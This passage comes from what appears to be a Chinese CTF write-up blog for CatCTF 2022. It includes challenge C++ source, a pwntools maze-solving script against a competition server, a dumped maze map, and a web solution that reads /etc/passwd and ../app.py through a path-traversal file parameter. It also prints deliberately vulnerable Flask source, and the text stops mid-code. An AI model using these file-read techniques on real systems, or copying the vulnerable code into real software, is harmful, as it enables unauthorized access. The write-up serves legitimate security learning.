class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Success] Created!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">update</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Which one do you want to update?&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cin</span> &gt;&gt; idx;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (idx &gt;= cnt)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Error] No such one.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">string</span> content;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please enter the new content &gt;&gt; &quot;</span>;</span><br><span class="line">  <span class="built_in">cin</span> &gt;&gt; content;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (content.size() &gt;= <span class="number">0x100</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Error] Content is too long.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  lst[idx]-&gt;update((<span class="type">char</span>*) content.c_str());</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Success] Updated!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">display</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Which one do you want to display?&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cin</span> &gt;&gt; idx;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (idx &gt;= cnt)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Error] No such one.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  lst[idx]-&gt;print();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> choice;</span><br><span class="line">  </span><br><span class="line">  try</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      <span class="built_in">cin</span> &gt;&gt; choice;</span><br><span class="line">      <span class="keyword">switch</span>(choice)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        create();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        update();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        display();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bye~&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Error] Invild choice.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  catch(<span class="type">int</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Error!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Cat-of-magic🧙‍♀️"><a href="#Cat-of-magic🧙‍♀️" class="headerlink" title="Cat of magic🧙‍♀️"></a>Cat of magic🧙‍♀️</h3><p>made by xiaoji233</p>
<p>根据题意，是一个 20*20 的迷宫，然后有10层。根据所给文件，我们可以得到要救出100次猫，在第一层下楼之后就会得到 flag。猫应该是在第 10 层的 18，18 的位置。</p>
<p>通过 dfs 算法把迷宫样貌跑出来，然后手走，走到第10层之后发现 18，18 的位置中被墙壁封锁了。但是给了个锤子，应该是要用锤子砸墙壁然后救到猫，但是每次都要走到第一层，时间上来不太够。于是考虑其它方法，观察到全局变量中有 RescueCat 变量，并且最后判断的时候只需要判断救出的猫是否 &gt;&#x3D;100 即可，并且移动选择器的算法中，在处理的时候会强制把当前位置变成’.’，因此拿了锤子直接在第一层开始砸墙，向上进行变量覆盖，覆盖任意一个字节或两个字节到 RescueCat 变量中再从第一层走出即可拿到 flag。</p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><p>dfs的python脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;101.43.78.225&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">maze=[]</span><br><span class="line">IsGo=[]</span><br><span class="line">doorkey=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">dx=[<span class="number">1</span>,-<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">dy=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,-<span class="number">1</span>]</span><br><span class="line">flag=<span class="number">1</span></span><br><span class="line">x=<span class="number">1</span></span><br><span class="line">y=<span class="number">1</span></span><br><span class="line">key=<span class="string">&#x27;DASW&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">InitMaze</span>():</span><br><span class="line">    <span class="keyword">global</span> maze,IsGo</span><br><span class="line">    maze = []</span><br><span class="line">    IsGo = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        s=[<span class="string">&#x27;#&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line">        maze.append(s)</span><br><span class="line">        k=[<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line">        IsGo.append(k)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(Y/N)&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge</span>():</span><br><span class="line">    s=p.recvuntil(<span class="string">b&#x27;Now you see:\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;can&#x27;t&quot;</span> <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_maze</span>(<span class="params">k</span>):</span><br><span class="line">    <span class="keyword">global</span> maze,x,y,flag</span><br><span class="line">    res=judge()</span><br><span class="line">    <span class="built_in">print</span>(res,x,y)</span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        x += dx[k]</span><br><span class="line">        y += dy[k]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        s = p.recvline().decode()</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span>(maze[y+i-<span class="number">1</span>][x+j-<span class="number">1</span>]==<span class="string">&#x27;#&#x27;</span> <span class="keyword">or</span> maze[y+i-<span class="number">1</span>][x+j-<span class="number">1</span>]==<span class="string">&#x27;@&#x27;</span> <span class="keyword">or</span> flag):maze[y+i-<span class="number">1</span>][x+j-<span class="number">1</span>]=s[j]</span><br><span class="line">    <span class="keyword">if</span> x==<span class="number">3</span> <span class="keyword">and</span> y==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(res, x, y)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PrintMaze</span>():</span><br><span class="line">    <span class="comment">#os.system(&quot;cls&quot;)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">            <span class="keyword">if</span> i==y <span class="keyword">and</span> j==x:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;@&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(maze[i][j],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">move</span>(<span class="params"><span class="built_in">dir</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">dir</span>)!=<span class="number">1</span>:<span class="keyword">return</span></span><br><span class="line">    <span class="built_in">dir</span>=<span class="built_in">dir</span>.upper()</span><br><span class="line">    k = key.find(<span class="built_in">dir</span>)</span><br><span class="line">    <span class="keyword">if</span>(k==-<span class="number">1</span>):<span class="keyword">return</span></span><br><span class="line">    p.sendline(<span class="built_in">dir</span>)</span><br><span class="line">    res=get_maze(k)</span><br><span class="line">    PrintMaze()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">line=<span class="string">&#x27;ssDdww&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>():</span><br><span class="line">    dot=[]</span><br><span class="line">    door=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        nx=x+dx[i]</span><br><span class="line">        ny=y+dy[i]</span><br><span class="line">        <span class="keyword">if</span> IsGo[ny][nx]==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> maze[ny][nx]==<span class="string">&#x27;.&#x27;</span> <span class="keyword">or</span> maze[ny][nx]&gt;=<span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> maze[ny][nx]&lt;=<span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">                dot.append(i)</span><br><span class="line">            <span class="keyword">elif</span> maze[ny][nx]&gt;=<span class="string">&#x27;A&#x27;</span> <span class="keyword">and</span> maze[ny][nx]&lt;=<span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">                door.append(i)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> dot:</span><br><span class="line">        nx = x + dx[k]</span><br><span class="line">        ny = y + dy[k]</span><br><span class="line">        <span class="keyword">if</span> maze[ny][nx]&gt;=<span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> maze[ny][nx] &lt;=<span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">            doorkey[<span class="built_in">ord</span>(maze[ny][nx]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)]+=<span class="number">1</span></span><br><span class="line">        IsGo[y][x] = <span class="number">1</span></span><br><span class="line">        move(key[k])</span><br><span class="line">        dfs()</span><br><span class="line">        move(key[k^<span class="number">1</span>])</span><br><span class="line">        IsGo[y][x] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> door:</span><br><span class="line">        nx = x + dx[k]</span><br><span class="line">        ny = y + dy[k]</span><br><span class="line">        <span class="keyword">if</span> doorkey[<span class="built_in">ord</span>(maze[ny][nx])-<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)]:</span><br><span class="line">            doorkey[<span class="built_in">ord</span>(maze[ny][nx])-<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)]-=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        IsGo[y][x] = <span class="number">1</span></span><br><span class="line">        move(key[k])</span><br><span class="line">        dfs()</span><br><span class="line">        move(key[k ^ <span class="number">1</span>])</span><br><span class="line">        IsGo[y][x] = <span class="number">0</span></span><br><span class="line">choice()</span><br><span class="line">choice()</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">InitMaze()</span><br><span class="line">get_maze(-<span class="number">1</span>)</span><br><span class="line">PrintMaze()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="built_in">len</span>(line):</span><br><span class="line">    <span class="built_in">dir</span>=line[i]</span><br><span class="line">    move(<span class="built_in">dir</span>)</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="comment"># x=1</span></span><br><span class="line"><span class="comment"># y=1</span></span><br><span class="line"><span class="comment"># InitMaze()</span></span><br><span class="line"><span class="comment"># move(&#x27;W&#x27;)</span></span><br><span class="line">dfs()</span><br><span class="line">cmd=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">dir</span>=<span class="built_in">input</span>(<span class="string">&#x27;cmd$&#x27;</span>)</span><br><span class="line">    <span class="built_in">dir</span>=<span class="built_in">dir</span>.upper()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">dir</span>==<span class="string">&#x27;PRINT&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(cmd)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">dir</span>=<span class="built_in">dir</span>[<span class="number">0</span>]</span><br><span class="line">    k=key.find(<span class="built_in">dir</span>)</span><br><span class="line">    <span class="keyword">if</span> k==-<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;wrong&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> move(<span class="built_in">dir</span>):</span><br><span class="line">        cmd += key[k]</span><br></pre></td></tr></table></figure>

<p>在这个脚本中，会记录地图一层的样貌，可以手走。得到手走的payload之后可以在line变量末尾添加，再以此为基础再进行dfs，多次来回之后可以得到地图全貌和路线。</p>
<h4 id="地图"><a href="#地图" class="headerlink" title="地图"></a>地图</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#####################&lt;#...............a##.#.######A##########...#......#.......######B####.#.#####C##aaaa.#c#..#.#...#.########.#.##.#.#.#.##.A.#.A.#..#.#.#.#.##.#.A.#.##.#.#.#.#.##.#######..#.#.#.#.##.........##.#.#.#.##.##########.#.#.#.##.#...#..#..A#.#.#.##.#.#.#.####.#b#.#.##.#.#.#..#...###.#.##.#.#.##.#.#.#.#.#.##...#.#..#.#.#...#.######.#.##.#.#.#.#.##..........#...#.#&gt;##########################################&lt;#............#...##.#.###.######.#.#.##...#.#.#.#..#.#.#.######.#.#.C.b#.#.#.##.........#..#.#.#.#########.#######.#.##...#.a#.........#.##.#.#.##.#########.##.#.#.##.#.........##.#.#..#.#.##########.#.##.#.#....B....##.#....#.#.#.#.###.##.#.####.#.#.#a#c#.##.#.AAb#.#.#.#a#.#.##.######.#.#.###.#.##........###.A...#.##.########&gt;#######.##........#B........##########################################&lt;.................########.##########.##..........#...#b#.########.#..#.#.#.#.##....a#.#..#.#.#.#.##.#####.#....#.#.#.##.#a..C.######.#.#.##.#####......#.#.#.##.C.#...######.#.#.##.#.#.#......#.A.#.##.#.#.#.####.#####.##.#.#.#....#.#a....##.#.#.#.####.########.#.#.#....#B.....c##.#.#.####.#.########.#.#.#....#A.....c##.#.#.######.########.#...#.....A.....&gt;##########################################&lt;#a...............##.################.##..................##.###################.A...............b##.###################.C...............a##.###################.#.A.#.a.#.BA#.CB&gt;##.Bc#ba.#.B.#Ac.#..##.###################.B..............aa##.###################.C.............bbb##.###################.AA............bbb##.###################.BBB.............c##########################################&lt;#................##.#.##############.##.#..............#.##.##############.#.##.#..............#.##.#.##############.##.#..............#.##.##############.#.##.#ac#...#...#...#.##.##B..#...#...#.#.##.################.##..................##b###################.#...............&gt;##.#C#################.#................##.################.##A.................##########################################&lt;#.a..............##.#.##############.##...#...........b#.######A############.##................#.#################.#.##...Ca#c.......#.#.##.#.#a########A#.#.##.#.#.#........#.#.##.#.#.#.########.#.##.#.#.#.#.C....#.#.##.#.#.#.#&gt;#.##.#.#.##.#.#.#A######.#.#.##.#.#..........#.#.##.#.############.#.##.#................##.###################.B...............c##########################################&lt;................a##.################.##..................###################A##..................##.###################..................##.################.##.#aB.#c####&gt;#...#.##.#.#.#..##.C#.#.#.##.#.#.#.####.#.#.#.##.#.#.#..##..#.#.#.##.#.#.##.##.##.#.#.##.#.#.#..##..#.#.#.##.#.#.#.####.#.#.#.##.#.#.#..##.b#.#.#.##.#.#.##.##.##.#.#.##...#....##....#.A.##########################################&lt;#...............c##.#.#################..................#################C####c#..............#&gt;##.#.############.#.##.#.#.........a#.#.##.#.#.##########.#.##.#.#..........#.#.##.#.##########.#.#.##.#.#..........#.#B##.#.#.##########.#.##.#.#.............C##.#.#.############.##.#.#.#...#...#b##.##.#.#.#.#.#.#.#.##.##.#.#.#.#.#.#.#.##.##.A.#...#...#.A.##a##########################################&lt;#.......a........##.#C##############C##cc................####A#################&gt;#.C.............b##.#.#################.#.#..............##.#.#.############.##.#.#.#..a#........##.#.#.#.#.#.####.#.##.#.#.#.#.#......#.##.#.#.#.#.#.####.#.##.#.#.#.#.#......#.##.#.#.#.#.######.#.##.#.#.#.#.#..A.#.#.##.#...#.#.#.c#...#.##.#####.#.########.##.C.....#.B........##########################################&lt;.................####.##############C##...#....#...#...#.##.#...##...#...#b#.##.#.##############.##.#..............#.##.##############.#.##.#..............#.##.#.##############.##.#..............#.##.##############.#.##.#..............#.##.#.##############.##.#..............#.##.##############B#T##.#a.............####A###################...............c#-#####################</span><br></pre></td></tr></table></figure>

<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ez-js🐦"><a href="#ez-js🐦" class="headerlink" title="ez_js🐦"></a>ez_js🐦</h3><img src="/2023/01/01/Nepnep-CatCTF2022/ezjs_0joxEf_9RP.png" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/ezjsFlag_ZAsp7O0tyR.png" class="">

<h3 id="Cat-cat😼"><a href="#Cat-cat😼" class="headerlink" title="Cat cat😼"></a>Cat cat😼</h3><p>Edited by lx56</p>
<h4 id="信息收集与尝试"><a href="#信息收集与尝试" class="headerlink" title="信息收集与尝试"></a>信息收集与尝试</h4><h4 id="题目首页"><a href="#题目首页" class="headerlink" title="题目首页"></a>题目首页</h4><p>进入题目首页可得以下界面</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/%E6%88%AA%E5%9B%BE1_Uri1WaaZUX.png" class="">

<p>尝试点击绿色文字可以跳转到如下页面，可以猜测可能存在任意文件读取</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/%E6%88%AA%E5%9B%BE2_NkYSZXQpfC.jpg" class="">

<h4 id="尝试读取系统文件"><a href="#尝试读取系统文件" class="headerlink" title="尝试读取系统文件"></a>尝试读取系统文件</h4><p>检测是否能任意文件读取，读取&#x2F;etc&#x2F;passwd成功</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/%E6%88%AA%E5%9B%BE3_kQ1eEIpmBZ.jpg" class="">

<h4 id="读取源码"><a href="#读取源码" class="headerlink" title="读取源码"></a>读取源码</h4><p>先读取cmdline获取源码文件名</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/%E6%88%AA%E5%9B%BE4_-CVDzoa2Ty.jpg" class="">

<p>通过..&#x2F;app.py读取源码</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/%E6%88%AA%E5%9B%BE5_GcJcK3a_on.jpg" class="">

<p>上图读出来的源码很乱，但由前面b开头可知这是python中的bytes类型</p>
<p>可以直接使用bytes的decode()方法获取格式化的源码，如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">b&#x27;abc\nabc&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a.decode())</span><br></pre></td></tr></table></figure>

<img src="/2023/01/01/Nepnep-CatCTF2022/%E6%88%AA%E5%9B%BE6_eUY-8G2vkP.jpg" class="">

<p>获取源码如下</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/%E6%88%AA%E5%9B%BE7_6d29js3muE.jpg" class="">

<h4 id="app-py"><a href="#app-py" class="headerlink" title="app.py"></a><a target="_blank" rel="noopener" href="http://app.py/" title="app.py">app.py</a></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, Markup</span><br><span class="line"><span class="keyword">from</span> cat <span class="keyword">import</span> cat</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">app = Flask(</span><br><span class="line"> __name__,</span><br><span class="line"> static_url_path=<span class="string">&#x27;/&#x27;</span>,</span><br><span class="line"> static_folder=<span class="string">&#x27;static&#x27;</span></span><br><span class="line">)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;*abcdefgh&quot;</span></span><br><span class="line"><span class="keyword">if</span> os.path.isfile(<span class="string">&quot;/flag&quot;</span>):</span><br><span class="line"> flag = cat(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line"> os.remove(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"> detailtxt = os.listdir(<span class="string">&#x27;./details/&#x27;</span>)</span><br><span class="line"> cats_list = []</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> detailtxt:</span><br><span class="line">   cats_list.append(i[:i.index(<span class="string">&#x27;.&#x27;</span>)])</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, cats_list=cats_list, cat=cat)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/info&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line"> filename = <span class="string">&quot;./details/&quot;</span> + request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"> start = request.args.get(<span class="string">&#x27;start&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"> end = request.args.get(<span class="string">&#x27;end&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"> name = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)[:request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>).index(<span class="string">&#x27;.&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> render_template(<span class="string">&quot;detail.html&quot;</span>, catname=name, info=cat(filename, start, end))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_can_list_root</span>():</span><br><span class="line"> <span class="keyword">if</span> session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">   <span class="keyword">return</span> flag</span><br><span class="line"> <span class="keyword">else</span>:</span><br><span class="line">   session[<span 